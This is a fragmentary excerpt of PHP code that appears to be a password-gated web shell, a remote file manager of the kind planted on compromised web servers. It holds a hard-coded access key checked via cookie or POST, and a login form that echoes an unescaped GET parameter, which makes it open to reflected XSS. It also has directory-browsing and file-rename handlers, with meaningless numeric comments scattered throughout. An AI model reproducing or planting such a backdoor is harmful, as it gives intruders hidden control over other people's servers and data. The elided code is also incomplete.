...
$auth_key = "e01d463b64ff4a08473df7c1e1121a6b";
...
$pass = false;
if (isset($_COOKIE['pw_name_50606'])) {
    if(($_COOKIE['pw_name_50606']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_50606'])) {
        if(($_POST['pw_name_50606']) == $auth_key) {
            setcookie("pw_name_50606", $_POST['pw_name_50606']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_50606' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1725805291447835 1725805291742851 1725805291354499 1725805291565592
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1725805291447835 1725805291742851 1725805291354499 1725805291565592
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1725805291447835 1725805291742851 1725805291354499 1725805291565592
            $name = PATH . "/" . $_GET['r'];
